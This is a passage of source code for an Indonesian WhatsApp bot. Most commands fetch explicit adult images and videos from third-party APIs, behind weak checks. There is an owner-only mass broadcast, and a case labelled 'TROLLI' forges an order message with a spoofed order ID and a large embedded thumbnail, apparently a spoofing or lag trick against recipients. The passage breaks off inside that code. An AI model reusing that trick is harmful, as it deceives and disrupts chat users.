							KonX.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break   
  case 'bc':
      case 'broadcast':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await KonX.chats.all()
             if (isMedia && !KonX.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(konx).replace('quotedM','m')).message.extendedTextMessage.contextInfo : konx
             bc = await KonX.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             atk.sendMessage(_.jid, bc, image, {quoted:mek,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
             sendMess(_.jid, `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`)
}
             reply('Suksess broadcast')
}
             break    				       
case 'neko':
               if (!isRegistered) return reply (mess.banned)
               reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/neko`)
                const bbc = await KonX.prepareMessage(from, buffer, MessageType.image)

            const button = [{buttonId:`${prefix + command}`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMessages = {

            contentText: `_© By Akaml_`,

            buttons: button,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bbc.message.imageMessage

            }

            await KonX.sendMessage(from, ButonMessages, MessageType.buttonsMessage, {quoted : mek})
                break                
                case 'yuri':
                if (!isRegistered) return reply (mess.banned)
               reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/futanari`)
                const bba = await KonX.prepareMessage(from, buffer, MessageType.image)

            const buttons = [{buttonId:`${prefix + command}`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonsMessages = {

            contentText: `_© By 19-Team_`,

            buttons: buttons,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bba.message.imageMessage

            }

            await KonX.sendMessage(from, ButonsMessages, MessageType.buttonsMessage, {quoted : mek})
                break                
case 'xvideo':
case 'xv':
if (!c) return reply('Linknya?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
KonX.sendMessage(from, vid, video, {quoted: mek})
break
case 'anal':
          if (!isRegistered) return reply(mess.only.group)
          reply(mess.wait)
          aku = (`https://api.dhamzxploit.my.id/api/nsfw/anal`)
          kon = await getBuffer(aku)
          pll = `© By 19-TEAM`
   sendButImage(from, pll, `Klik Next Untuk Melanjutkan`, kon, [                      
          {
            buttonId: `${prefix}anal`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
    case 'lesbian':
          if (!isGroup) return reply(mess.only.group)
          reply(mess.wait)
          kau = (`https://api.dhamzxploit.my.id/api/nsfw/lesbian`)
          kon = await getBuffer(kau)
          pll = `© By 19-TEAM`
   sendButImage(from, pll, `Klik Next Untuk Melanjutkan`, kon, [                      
          {
            buttonId: `${prefix}lesbian`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
    case 'eroneko':
          if (!isGroup) return reply(mess.only.group)
          reply(mess.wait)
          hai = (`https://api.dhamzxploit.my.id/api/nsfw/eroneko`)
          kon = await getBuffer(hai)
          pll = `© By 19-TEAM`
   sendButImage(from, pll, `Klik Next Untuk Melanjutkan`, kon, [                      
          {
            buttonId: `${prefix}eroneko`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break
case 'bj':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
yoiz = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/bj`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              KonX.relayWAMessage(prep)
break
case 'kitsune':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'baka':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'slap':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'poke':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case 'keta':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              KonX.relayWAMessage(prep)
break
case  'awoo':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
KonX.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
KonX.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
break
case  'hentai': 
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
KonX.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
break
case  'megumin':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
KonX.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
break
case  'neko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
KonX.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
break
case 'trapnime':
          if (!isGroup) return reply(mess.only.group)
          reply(mess.wait)
          anu = await fetchJson(`https://api.dhamzxploit.my.id/api/nsfw/trapnime`)
          kon = await getBuffer(anu.url)
          pll = `© By 19-TEAM`
   sendButImage(from, pll, `Klik Next Untuk Melanjutkan`, kon, [                      
          {
            buttonId: `${prefix}trapnime`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break
//Done
case 'nuliskanan':
        case 'kanannulis':
               if (args.length < 1) return reply('Yang mau di tulis apaan?')
               teks = args.join(' ')
               reply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               KonX.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break
case 'foliokanan':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              KonX.relayWAMessage(prep)
break
case 'p': // TROLLI
buf = Mfake
imeu = await KonX.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await KonX.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZYlCAbAiouWTkh8NRjO5PemOmw60uN7HdBV1OZZPFY7t1qOurqTkMLNzRE5A8jT4PulT8ai7r3Xxn3e1UlRJ2jcmWHU7UQhPKB5fnQUR5mHkKKVsKp9c0xDwIU79t6ctLZ7p8BSR2puOJpZuRerd607hLQI4bdXkQcx6ZqJzo0hCzOb3SZ7dS3IcDcjFKtf1TTI5oWygzjcUqj5WtlvF+AWHV7y2iWOCbCL0XAOKdHE+ooPrxsB5rUJNMkf1iPhUdc3buuF90YrVswNBfXL6GLneGKRfJVOTRB12VE5ns89Nlk9fhTcHgx6XbXE3NytEhJAz1A7Cibm3UQnAyNvzp9jHE1uJvrW0y/ca6XWLXqRKvxWmvogKjpXJtNsBRTphaDF1a0b/OI+KmnBqFq3S4j+ZxUabId0rg2IH9B+6jsOibWeJx7ksbD0Iqk8ccVwadA0MDCS6cEbdFrriRY7HTXmchFGxJ2rHdQu/pN08h2ycKPIfCpbY0jyWRpJGkcks3UmuUB/pBLdgBRFrZSzMvOCinz61N2dtEHEVvGJGHYdPmazlOjSMGyHj01zF40+AD0XuakLDQ5px4jIVQ+lW3TND5mWa7xJL2GPdUegovW5Bb2awwLhmPIoHc96z+Rs0+NIo9xEiOYoF9xDgnzNRvMWmIHn3qzXlmLS0bb3gNzj7/9+lV/ToTLdHY7b1pGXVmcouwaUlW37U3zHmp69U+PIF7b0Ez43860Rk0ESH3FYdajLz623TrRfPzQMCehoGRuZcHtTGdRbY88GnWcBQM9KGB2yK9D9qCSe0B1e+i8Q9962XRmCwoOmMVgVvM0TiRDgitS4T19Lq3VXcCUdfWsMqafI6MLtUX2UBunlmlTFrMJAPWlUbNDOHJyT1oaSn5NgaGffPlXQcaNZ0NFl0WxLb/yEH4CpC4XmgcDY4OCO1RvCjFuHrE/9MD8alH+qRjrWgFFvNc1O0uIEE+VdypDKD2r2Tii/iBJELfFP2NCcRLh7Vv+tj8DUTeNhDWatIGWCLjS52ElpCw81Yj96kU4sUf82zYeqyZ/SqCDipg75ocmgSHeOtds9T0c2xMlsedW5pMYPXbb51TdP0o3WoBIcCAqG8Qb8yjv99EcQWwu5UichUxztITgIB3/AB6ULpetjR7Jra0iimHMcyyOQTnyA6dPM1Em2utmkaWyfTSwX5nZ3zsqj3c/dU7pmnLAowiqc9BVe0XiqzZgL2Frdzt4medPvHT7qtaXUJHPHIpXA5TnY571zSUl9x1RcXoNJAIUHAA3PlUS3+KuzcLjkjHhwr6+de3c7yYhg2L7MfIV60iQgAEBYlzn1osaREcUMkMCwqdzux8gP71EcOQ87OzD62+3lS1G5N7dOV+qdiT5CndOk+j2c8g645QK01GiNsjo4PGuL18ZVcgVXpwVLDuDV00mDk06Z23J3+Jqn3g/xEo88mtYStsynGkmCByFNDnqacztTb7CtTJngOc1yKVIUEhFoOdyp6EUbp11Jpt8jcxCEgk+lA2XMblAn1jU1daRcSRYjSSWUAMFVSTg/CpdaZcb2jUNB1RJ4kJYc2N8GlVG0OHU7CBJJraeJc8uXQilXLJOLo6VJNWSMo7UM53oiU+tCyEV2HGatwU3Nw3ZeikfiammG3TtUBwC/Nwzb/6WYfjVhPSqQGecUrywQnuJx+tV+9bPKKsnFy/4UHyuF/OqzMjSz4QbDr6VDAYG+cVJpOmMFt6YW35B50POwXIHXzqBpEVxrKPo1ukZ92V2L478oGPzNVkA+AQOg3qxa6hn04d2hk5/kwwfxAqDZeWPB8t6qOh+wOGTw5Qc4Hf1FTejahMZo7eKQgZ9wdgfSoPwyGB6inrUslzG0YJYMMAd6JK0NNpmh2useFF/OQJKdgxoO/1IzoYbc+IzH3iOn31PLY209zc8mHQucxSqNjnseh/Cq3remSWk5a0k8FAccsm2D6VyxSbo6pNpDUgFvEoGC7nGfM0RHGXiSJQdtgv71Bwyuk/iTzr5c7I23wOMCrbongPCZYZEk5epU5x8aqacUTBqQ/dKLXTxHkcxG9Z9eHmvZwOgBq66vcKEYs2yjsapCHxBcTHozcoNPEqthm9ICccrN6VwVLMAK6lPvHHc09ZRl548dc10Wcx7f2ohSMr0IyaBq0TabJNyBkflxgnG5HlXVpw1JqV0LaArEx35n2AApJiaGeCNGOpag08x5LO3HNI/T5Zqwavxp9DJg0S3jESnHiOM83qB+9Seq6THw/wXc21q7OxIMkhGCxJAJ9KzWTONz6VehLsuek+0G/jcfT4YZoP6uUcrAenalVJK8qbdD1pUPsdF8lO9DSUTJQshpEml+zqQ/wDDwBOyyuPyNWkbiqf7Nmzos48p2/8AqtW5TVIbKbxJb/SIJEzy4kDZ+BqGS3AGR071aNVjLNIq78zdKg79JlXkjikA7nlNQ0BDXkgX3U6+YqJl2Jo+7BjHvZB9aYRAyqxqSroFVB4sAbdXbDA9CD2ovingi6tpJJdLXx7Y9I8++v70PdAh4huCWrULO4F1p8M3d0BPx71Em49mkEpdMwRtJv8AxeX6Fc83l4TZ/KrDw1w7crexz3KBXQ5SInfm7E+WK1WaATAhQK50+G3tXEZixLueYjrUSyN9GscSXZFvpzWtkD/Wep9ayHXdTl1LVXlaRzGmUiBOeVR0redWZZLJ8DmK74Hevn+/ga0vJrdwCY3K589+tViSUmTltoGEk0bZV2HqDRdncyxSeJG3hydOZe/oR3FCnpT6JygbjffY1uzBIl7y/jezDXAc8zcrRxtgj1yQdj2+flQptTJDB9EbMBBYF9iDnBJ/Kpzg20tb+S5tb2ESr4XMM9sEfv8AnUnf2VtAyRRRKltF0T7R9TWDkovijZRbXJsoc9k0ExSYjmABAB60Xo0XNcpyjpvT+tktdNIepAAx0FPaTA0cIk3DNWnrszdLRZ0OF6U5G5idXjJVx0IqJVplA99vOuhPOP6s/EUUZljiukvLeWy1A80MwK8x2xVH1jhq/wBOmbELzQA+7Ki5GPUdqmluZhgHl+6pLTdZmtyBK58MbYxkCm5UVFWUWy0e/v5Alvayv5nlIA+J6Uq16C6eYBg4wRnalWXzo6FhbWykymhZDRMvWhJD1rc5TQfZkS2nXqDtMD96/wBquFv4hU+KoV8/0tzbfHAqkeytsxaovk0ZHzDVeY5C0roY3ULjDHGG+G9UgG7OG2kMkkyM0nORnPSiTBZ9jIPlQVvNGkk6PIisJCcE4NEhwRswI9DQB01tbsMc+R5MlDS6RYyK3NBbn1KAUbbwSTkcg2+0egqp+1Th6/n0VrvS7u5JhGZ7dXIV08wB3FAErHwnp90ys1tFyDowz+FE6npVvp9siWKckSbFSc/OqP7HuMeYroeoye8B/hpGPUfYP6Vp+ox+PBImccw2PkamUbRUXTsp6zG25mlH8v03NcJeWOo8whmUumxwcEGnNRhZkKMMMDuKqlzpgWUvHzwyk55l2zXDJ8ej1/Gwxyq7plla3kVyBMxGO5qo8T8InUAZ7RgLodQ2wcfvVi0+W6aPEgDEbcxOC3yo+Es2Sy4og6doxyw7cZGHXenXNlM0d1C8bKce8Nj8D3rqysp7uYRWkLyv5KM4+Nbm8KSxlJEDoTnlYZBoC8uobOPwrZFMnZVAAX41u8tK2cyxd9FRs7Q6Bp7IzKdSnGWPUIOwpCO4vrNbpuUkAhwNsY7inbyB5HZ2y8rn5k0dqVsbLRVt1GWZcPjv5/rU43yfIMq4riUGSN767Y4IjXp8KmYowI0wPhVgsLFbLTvD5VaV8BsjOSev61a9J03TrxDmGAOvu8pXetkrMJMz0IdjXvh+lab/AMMWDKMwxg47MRTL8IWbdEcf9slXxIM78IY3H4UHqV5a2EYNw3vHog3JrvjDXNO0+Z7TRnknuEPK8rEFFPcDz/31qgTzSXEzSTOXc9STSoC5afxlDanlMEvh+WRSqk0qh4ot2aRyyiqRoUxwCaBlY9TRUzbGgZTWhmXn2UuPpWpp5pGcfAn960UVmHsrfGs3i+dvn7mH71poPSqQFE49gVjcyY94Rnf5UZ7OuEjd2sGo6kzi3IBihBI5/U+lWlOH01K9M18oNoB9Q/5n9qsiFI48KoVFGAqjAA8hUqPYx1VCIFRQqgYAA2FcsAV3wR3ryKZZowy9Om9dVQGA+1HhOTQNV/iulKyWUjh8pt4L5/AVevZ9xgvEem/R7twNSgH8wfbH2h+tXfUrO3v7Ke1u41kglUqynvXzlr2nahwLxMk1qzcisWglI2dfsn8jQBul7aiccw92QdD5/GoWaLw25ZkIb8/hRvCuvW3Emkpd2pCy/VlizujdxUnJCsilZFDDyNZzxqRpDI4lWkuBGMRx5+O1CS39woPJGmas0mkwv9Ush8utDHRGztMPmn965niyejojlh7KrLeX8ux91fIbVwkMxAUIWYnYDqauEeiIGBkmLeijFH29pBajMUYDEfWO5NC8eUnchvyIpfSisafpJhX6Rd48QfVTsv8Aembm2+k3Ku4HhR7n1NWm4tzLu2VXue9MPZpgKo90dzXUsaiqRyym5O2V6O1aWTxGGFA90Y3+NP20TQsChYEHIxU0LXB6ZxSS1DZ23p8SbHtPvRMBHLtKP/Kq37Q+LrTR9IuLW1uFfUplKIsbAmPOxY+VSetWAm0u8iDMjFCoZTgjI/vXzhNG0czxuMOrEH4inRJzXhr3vvSoA8pV7SoAvTqztyqCWPQCvTpV8+CltI3far7oNno0djFM0ZeZ0HMS+cHvRxXTCGPhfzOgbmrOXK+i0o+yp8BwT6brUkt3E0UbQsmW88g4/CtQ0lku7j3CHRDlv2qvQrpaLloH5sb4frVt0m3htLRDCnIrkOQTk/7xTg5extQrol17+QobqzKfjRMTK6+7TEq8r5FaEDFo/LPKnbqKIdsd6AVgmpY7MMUcBzHagDhnJHKO9QPF3D1rr2jS2V0oDn3o5Mbo3Y1YSBEpbqaFLmQnIoA+ctHvtQ4D4odLlGwp5ZowdpE8x+YrfNH1G21WxiurR1kgkGVYfl8agfaDwdFxHpxeBVXUYVzE/Tm/0n0rKuBuJrrhPWHstQEi2hflljbrG32h+tAG/mNSOuK8EIx9fFeRTJcW8UsLho5FDKynYg08iEgZoAbEKjq33V7hFGVXf1p4rXnLvQAG6FyC24zS8Eg9Mii+XpXQAIoABSHLHNdpAFfPY0SwCj1NJB71AEffwj6PP61818W2zWvEV/EwxiUn796+n5V8WKUAdGxXz/7XLf6PxfI3LgSxKw/L9KGIpPevDXrUqQHg6Uq9FKgDZuCnD295GVJKsrfeMfpVmjhQoCyY+VVHgJyb+7jzs0YbHwP96uzfVIBxt2pAc2VrFPeRwchIJ94hdgKudygCbDFV/hu1YNLLlmVMAFjkk1ZZRzR7U0MFt5SgGx22xRLkOmRuD0oHZWIpmV5Vy0ZGPs0wObja9hY/axUmJEQEsagZLsyTxJKMMGG/zo6UlsUAO3FxzkBRtXEZwd+9eQR8wJJ716y4NAD+NtqzT2o8FfxWNtS02L/HRjLoo/5ij9a0cMRTiYwWPQUAYd7M+NW02SPSNUbFqXxFI3+Uc/VPp+VbiuCvNnasW9pvB0izXGr6bH7hJeaJR0H2h+tH+yzjczxx6Nqkn85Ri3lY/WH2T6+VAGu4zuK8xvTUEwYU6DQB4wrzFODpXhGBQANKcuB2p1MYGaFmP8wfGlfzGK0Yr9YjA+NAHelsZo3PZmJH31jft5jjj1TTGVTzlJAW7HBXb8a1vS5JI7P8FxWV+3xOX+Bscc5E3Ty9ygDJT19KVIbivM0hHoPWlXi9aVAGqcFSCPXcEgB4mG5+B/StBY4FZtwo/h